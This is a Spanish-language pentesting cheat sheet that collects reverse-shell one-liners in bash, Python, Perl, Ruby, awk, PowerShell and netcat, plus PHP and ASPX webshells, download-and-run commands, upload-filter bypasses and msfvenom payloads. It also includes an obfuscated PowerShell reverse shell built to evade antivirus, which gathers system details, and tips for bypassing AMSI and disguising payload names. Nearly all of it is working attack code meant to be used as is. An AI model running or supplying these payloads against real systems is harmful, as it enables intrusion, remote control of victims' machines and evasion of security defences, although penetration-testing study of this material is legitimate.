# Reverse Shells

Tags: #ReverseShell #BindShell #ForwardShell #Webshell #Netcat #PowerShell #PHP #Python #Pwncat #AMSI

## RECURSOS
* [RevShells Generator](https://www.revshells.com/) → generar one-liners automáticamente
* [Monkey Pentester Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [PowerShell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
* [P0wny Shell Webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)
* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)

## TIPOS
```
Reverse Shell  → la víctima se conecta al atacante → más común → pasa firewalls
Bind Shell     → el atacante se conecta a la víctima → útil cuando no hay salida
Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por firewall
```

## TIPS
1. **Puerto 443 → más probable que pase firewalls → usar siempre como primera opción**
2. **rlwrap nc → siempre en Windows → añade historial y flechas**
3. **Pwncat → mejor que netcat → TTY automática + enumeración integrada**
4. **IEX en memoria → no toca disco → más difícil de detectar**
5. **Después de obtener shell → aplicar tratamiento TTY → ver nota Tratamiento_TTY.md**


## 1. LISTENERS EN KALI

```bash
❯ nc -nlvp 443
# Linux → shell básica

❯ rlwrap nc -nlvp 443
# Windows → rlwrap añade historial y flechas → más cómodo

❯ pwncat-cs -lp 443
# Mejor opción → TTY automática + módulos de enumeración
# Dentro de pwncat:
  ❯ run enumerate              # Enumerar todo el sistema
  ❯ run enumerate.user         # Enumerar usuarios
  ❯ run enumerate.system.network  # Interfaces de red
  ❯ back                       # Ir a la terminal de la víctima
```

## 2. REVERSE SHELLS — LINUX

### Bash
```bash
❯ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
# La más común → probar siempre primero

❯ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1' &
# En segundo plano → no bloquea la terminal

❯ 0<&196;exec 196<>/dev/tcp/<IP_KALI>/443; bash <&196 >&196 2>&196
# Alternativa cuando la anterior falla

❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_KALI> 443 >/tmp/f
# mkfifo → cuando /dev/tcp no está disponible | recibir con nc

❯ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_KALI> 4242 >/tmp/f
# Evadir filtros → barra invertida en rm
```

### Python
```bash
❯ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP_KALI>",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
# Python3 → con PTY → mejor que sin ella

❯ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP_KALI>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
# Alternativa con subprocess

❯ python3 ---version
# Verificar que Python3 está instalado en la víctima antes de usar
```

### Netcat
```bash
❯ nc -e /bin/bash <IP_KALI> 443
# Con flag -e → no siempre disponible

❯ nc <IP_KALI> 443 -e /bin/bash
# Sintaxis alternativa
```

### Otros lenguajes
```bash
# Perl
❯ perl -e 'use Socket;$i="<IP_KALI>";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# Ruby
❯ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP_KALI>","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Awk
❯ awk 'BEGIN{s="/inet/tcp/0/<IP_KALI>/443";while(42){do{printf "shell>" |& s;s |& getline c;print c;while((c |& getline)>0)print |& s;close(c)}while(c!="exit")close(s)}}'
```

## 3. REVERSE SHELLS — WINDOWS (POWERSHELL)

### Clásica - Subiendo Netcat a Temp
```bash 
# Subir Netcat 
❯ certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','C:\Temp\nc.exe')"

# Ejecutar la Revershell 
❯ C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
```

### Runas
```bash 
# Ejecutar la revershell
# Se debe tener la password del usuario 'Administrator'
❯ runas /user:Administrator "C:\Users\user\nc.exe IP_Kali 443 -e cmd.exe"
	# user = Usuario que ejecutará el comando

❯ rlwrap nc -nlvp 443   # Recibir en Kali  
```

### One-liner básico PowerShellOneLine
```bash
❯ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP_KALI>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

NOTA: Si se crea el archivo .ps1 se debe de quitar la parte de 'powershell -nop -c'


# Recibir en Kali 
❯ rlwrap nc -nlvp 443

# Recibir en Windows 
❯ Import-Module .\Powercat.ps1 
❯ powercat -lpv 443
```

### Invoke-PowerShellTcp (Nishang)
```bash
# En Kali → preparar el script
❯ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
❯ echo "Invoke-PowerShellTcp -Reverse -IPAddress <IP_KALI> -Port 443" >> Invoke-PowerShellTcp.ps1
❯ python3 -m http.server 80

# Recibir con rlwrap nc -nlvp 443

# En la víctima → cargar y ejecutar en memoria
❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
# Desde CMD → dejarlo así
# Desde PS → quitar el powershell -c del inicio

# Con Ngrok (si la víctima no tiene acceso directo a Kali)
❯ ngrok tcp 443
# Usar el dominio y puerto de ngrok en el script
❯ echo "Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215" >> Invoke-PowerShellTcp.ps1

NOTA: 
	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
	2. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
	3. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
```

### Hoaxshell (evasión de AMSI)
```bash
❯ git clone https://github.com/t3l3machus/hoaxshell
❯ python3 hoaxshell.py -s <IP_KALI>
# Genera comando PowerShell ofuscado para ejecutar en la víctima
# Diseñado para evadir AMSI y soluciones AV
```

### PowerShell indetectable
```powershell
# Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
function ConvertFrom-ByteArray {

    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Byte[]]
        $ByteArray,

        [Parameter(Position = 1)]
        [ValidateSet('ASCII', 'UTF8', 'UTF16', 'UTF32')]
        [String]
        $Encoding = 'UTF8'
    )

    if (!$ByteArray) {
        return ''
    }

    [Text.Encoding]::GetEncoding($($Encoding -replace 'UTF','UTF-')).GetString($ByteArray)
}
# final de Funcion ConvertFrom-ByteArray


while ($true) {
    # Generando valores aleatorios y codificando en Base64
    $Base64 = [Convert]::ToBase64String((1..32 | %{[byte](Get-Random -Minimum 0 -Maximum 255)}));
    $Key = ([Convert]::FromBase64String($Base64));

    # Recopilacion de informacion del equipo victima
    $System = (Get-WmiObject Win32_OperatingSystem).Caption;
    $Version = (Get-WmiObject Win32_OperatingSystem).Version;
    $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
    $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
    $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    # Configuracion de la IPAddress
    $p = "192.168.45.220"

    # Concatenacion de variables de informacion el equipo con su respectiva clave:valor
    $w = "=> RECOPILACION DE INFORMACION DEL TARGET <= `r`n System: $System`r`n VERSION: $Version`r`n ARCH: $Architecture`r`n DIRECTORY: $WindowsDirectory`r`n AVS: $av`r`n GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
    
    $s = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0};
    $LUNA = ConvertFrom-ByteArray  @(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116)
    $r = "LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur."
    Set-Alias $r ($r[$true-11] + ($r[[byte]("0x" + "FF") -261]) + $r[[byte]("0x" + "2a") -2])
    
    # Configuracion de Puerto
    $y = New-Object $LUNA($p,443)
    $z = $y.GetStream()
    $d = $s::UTF8.GetBytes($w)
    $z.Write($d, 0, $d.Length)
    $SPARTAN = "whoami"
    $t = (LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur. $SPARTAN) + "@c2===> "

    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $s).GetString($b,0, $l)
        $d = $s::UTF8.GetBytes((LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur.  $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
        $z.Write($d, 0, $d.Length)
    }
    $y.Close()
    Start-Sleep -Seconds 7
}
```

### PowerShell via Python (.pyz para Windows)
```python
import os 

os.system('powershell -nop -W hidden -noni -ep bypass -c "'
'$u3e = \\"10.10.10.128\\"; '
'$k6u = 448; '
'function Connect-Back { '
'try { '
'$f1 = New-Object System.Net.Sockets.TCPClient($u3e, $k6u); '
'$f2 = $f1.GetStream(); '
'$d5g = New-Object System.IO.StreamReader($f2); '
'$j2h = New-Object System.IO.StreamWriter($f2); '
'$j2h.WriteLine(\\"[+] Conexión establecida con la Revershell\\"); '
'$j2h.WriteLine(\\"[+] Escribe \'exit\' para cerrar la conexión.\\"); '
'$j2h.Flush(); '
'while ($true) { '
'$j2h.Write(\\"PS: \\"); '
'$j2h.Flush(); '
'$cmd = $d5g.ReadLine(); '
'if ($cmd -eq \\"exit\\") { break }; '
'try { '
'$output = Invoke-Expression ($cmd) 2>&1; '
'if ($output -is [System.Collections.IEnumerable]) { '
'$output = $output | Out-String }; '
'$output = $output -replace \\"`t\\", \\"    \\"; '
'$output = $output -replace \\" {2,}\\", \\" \\"; '
'if ($output) { '
'$j2h.WriteLine(\\"[*] Resultado del comando:\\"); '
'$j2h.WriteLine($output) } '
'} catch { '
'$j2h.WriteLine(\\"[!] Error ejecutando el comando: $_\\") } '
'$j2h.Flush() }; '
'$d5g.Close(); '
'$j2h.Close(); '
'$f1.Close() } '
'catch { Write-Host \\"[!] Error al conectar con el servidor del atacante: $_\\" -ForegroundColor Red } '
'}; '
'Connect-Back"')
# Guardar como .pyz → ejecutable en Windows al hacer doble click
```

## 4. WEBSHELLS

### Extensiones PHP para bypass de filtros
```
.php .php3 .php4 .php5 .php6 .php7
.pht .phtm .phtml .phar .pHP
```

```php
# PHP de prueba para un inicio de subida 
<?php
echo "PHP_EXEC_OK";
?>
```
## PHP — Webshell básica

* [reverse.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) <-- Funcional 

```php
# cmd.php → subir al servidor y acceder desde el navegador
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>

# Alternativas equivalentes
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>

<?php system($_GET["cmd"]); ?>

<?php $output = shell_exec($_GET["cmd"]); echo "<pre>$output</pre>"; ?>

# Reverse shell directa en PHP para Kali 
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'"); ?>
```

### PHP — Via curl + index.html para Kali 
```bash
# En Kali → crear index.html con el payload
❯ nano index.html
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'

❯ python3 -m http.server 80

# En la víctima → ejecutar
❯ curl <IP_KALI> | bash
# Si no permite pipe a bash directamente:
❯ curl <IP_KALI> -o /tmp/reverse
❯ bash /tmp/reverse
```

### PHP — Via archivo .php para Kali 
```bash
# En Kali → crear reverse.php
❯ nano reverse.php
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'"); ?>

❯ python3 -m http.server 80

# En la víctima
❯ curl <IP_KALI>/reverse.php -o /tmp/reverse.php
❯ php /tmp/reverse.php
```

### PHP — Ejecutar desde URL para Kali 
```bash
# Con webshell ya subida → ejecutar reverse shell URL encoded
❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_KALI>%2F443%200%3E%261%27
# Decodificado: ?cmd=bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
```

### PHP — Ejecutar desde URL para Windows 
```bash 
# Subir Netcat desde la web 
	http://IP/cmd.php?cmd=certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe

# Ejecutar una revershell desde la web 
	http://IP/cmd.php?cmd=C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
```


### PHP — Subida de imagen con código PHP
```php
# image.png → contiene PHP → para bypass de upload
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>

# En Nginx → bypass con doble extensión en URL
❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami
# shell.jpg = extensión que acepta el servidor | shell.php = ejecución
```

### Weevely — Webshell ofuscada
```bash
# Crear webshell ofuscada
❯ weevely generate password ~/Desktop/weevely.php
❯ weevely generate password /root/shell.php.jpg     # Para bypass de WordPress

# Conectarse a la webshell
❯ weevely https://IP/uploads/weevely.php password
❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd

# Dentro de weevely
  ❯ :help                    # Ver comandos disponibles
  ❯ :system_info             # Info del sistema
  ❯ ls                       # Listar directorio
```

### RCE vía MySQL
```sql
-- Desde dentro de MySQL → escribir webshell al servidor web
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' FROM mysql.user LIMIT 1;
-- Acceder: http://IP/shell.php?cmd=whoami
```

### ASPX / ASP — Webshells para IIS (Windows)

```aspx
<%-- cmd.aspx → webshell básica para IIS --%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
%>
```

```asp
<%-- cmd.asp → webshell para IIS antiguo (ASP clásico) --%>
<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    Dim oExec
    Set oExec = oShell.Exec("cmd.exe /c " & cmd)
    Response.Write "<pre>" & oExec.StdOut.ReadAll() & "</pre>"
End If
%>
```

## Revershell Ejecutando desde un ASPX - Windows 

* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)

```bash
# Acceder a la webshell subida
❯ http://<IP>/cmd.aspx?cmd=whoami
❯ http://<IP>/cmd.asp?cmd=whoami

# Ejecutar reverse shell desde la webshell → URL encoded
❯ http://<IP>/cmd.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
```

```bash 
# Con msfvenom → generar ASPX con reverse shell directa
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f aspx -o reverse.aspx
# Subir el .aspx → acceder desde el navegador → recibir con nc -nlvp 443

❯ msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=443 -f asp -o reverse.asp
# Para IIS antiguo → x86

# Rutas comunes donde subir el archivo en IIS
C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP/cmd.aspx
C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
```

## 5. FORWARD SHELL (CUANDO REVERSE Y BIND ESTÁN BLOQUEADOS)

```bash
# PASO 1 → Crear o subir webshell básica en el servidor
❯ nano cmd.php
<?php echo shell_exec($_GET['cmd']); ?>

# PASO 2 → Descargar tty_over_http de s4vitar
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py
# Cambiar 'index.php' por 'cmd.php' dentro del script (o el nombre que uses)

# PASO 3 → Ejecutar el forward shell
❯ python3 tty_over_http.py
# Simula una TTY interactiva a través de peticiones HTTP
# Útil cuando el firewall bloquea conexiones salientes de la víctima
```
